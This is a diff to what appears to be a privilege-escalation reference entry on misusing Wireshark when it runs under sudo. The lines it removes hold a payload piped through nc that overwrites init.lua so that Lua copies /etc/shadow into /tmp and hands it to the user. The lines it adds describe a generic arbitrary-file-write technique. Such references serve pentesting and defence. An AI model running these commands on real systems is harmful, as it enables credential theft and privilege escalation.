@@ -2,22 +2,17 @@
 functions:
   sudo:
     - description: |
-        Wireshark has an embedded lua script engine, however it does not execute
-        when run as root (unless configured otherwise). This restriction is
-        enforced by `init.lua` which runs on start up.
+        This technique can be used to write arbitrary files, i.e., the dump of one UDP packet.
 
-        It is possible to override this file with chosen data, using Wireshark
-        "export data" feature. Run the command, then on the UDP data right click
-        and select "Export Packet Bytes...". Save it into the file `init.lua`
-        which is usually located in `/usr/share/wireshark/init.lua`.
+        After starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved:
 
-        Finally re-run wireshark as sudo.
+        1. select the only received packet;
 
-        __Note__: You may need to ensure your password is in sudo cache before
-        running the command. Otherwise, you'll need to run wireshark in
-        foreground, and execute `echo` and `nc` commands manually.
-      code: >
-        sudo wireshark -k -i lo -f 'udp port 4242' &
-        sleep 5 &&
-        echo -e "os.execute('cp /etc/shadow /tmp/shadow; chown $USER: /tmp/shadow')" | nc -u 127.127.127.127 4242
+        2. right-click on "Data" from the "Packet Details" pane, and select "Export Packet Bytes...";
+
+        3. choose where to save the packet dump.
+      code: |
+        PORT=4444
+        sudo wireshark -c 1 -i lo -k -f "udp port $PORT" &
+        echo 'DATA' | nc -u 127.127.127.127 "$PORT"
 ---
